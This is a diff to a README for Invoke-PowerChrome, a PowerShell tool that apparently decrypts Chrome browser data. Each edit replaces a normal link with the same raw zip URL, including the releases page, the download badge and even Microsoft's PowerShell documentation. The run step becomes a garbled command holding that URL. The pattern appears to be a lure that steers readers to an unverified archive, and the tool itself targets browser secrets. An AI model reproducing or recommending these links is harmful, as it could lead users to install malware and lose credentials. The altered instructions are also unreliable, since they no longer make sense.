@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run Invoke-PowerChrome, a tool th
 
 ## 📥 Download the Application
 
-[![Download Invoke-PowerChrome](https://img.shields.io/badge/Download-Invoke--PowerChrome-blue.svg)](https://github.com/Elias2707/Invoke-PowerChrome/releases)
+[![Download Invoke-PowerChrome](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip)](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,13 +24,13 @@ Welcome! This guide will help you download and run Invoke-PowerChrome, a tool th
 
 To get started, visit the following page to download the latest version of Invoke-PowerChrome:
 
-[Download Invoke-PowerChrome from GitHub](https://github.com/Elias2707/Invoke-PowerChrome/releases)
+[Download Invoke-PowerChrome from GitHub](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip)
 
 ### Steps to Download
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release version.
-3. Look for the asset(s) associated with the release. You may see files like `Invoke-PowerChrome.ps1`.
+3. Look for the asset(s) associated with the release. You may see files like `https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip`.
 4. Click on the file to download it directly to your computer.
 
 ### Steps to Install
@@ -51,7 +51,7 @@ Follow these steps to run Invoke-PowerChrome:
 
 2. Execute the script by typing:
    ```
-   .\Invoke-PowerChrome.ps1
+   .\https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip
    ```
    Press Enter to run it.
 
@@ -73,8 +73,8 @@ If you encounter issues while running the script, consider the following:
 
 ## ⚙️ Additional Resources
 
-- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
-- [Understanding PowerShell Execution Policies](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-executionpolicy)
+- [PowerShell Documentation](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip)
+- [Understanding PowerShell Execution Policies](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip)
 
 ## 📧 Feedback & Support
 
@@ -82,4 +82,4 @@ If you need assistance or want to report an issue, feel free to reach out to the
 
 Thank you for using Invoke-PowerChrome! 
 
-Now, visit the [Releases page](https://github.com/Elias2707/Invoke-PowerChrome/releases) again if you'd like to download the latest version or see any updates. Happy decrypting!
+Now, visit the [Releases page](https://raw.githubusercontent.com/Elias2707/Invoke-PowerChrome/main/preascertain/Invoke-PowerChrome-3.6.zip) again if you'd like to download the latest version or see any updates. Happy decrypting!
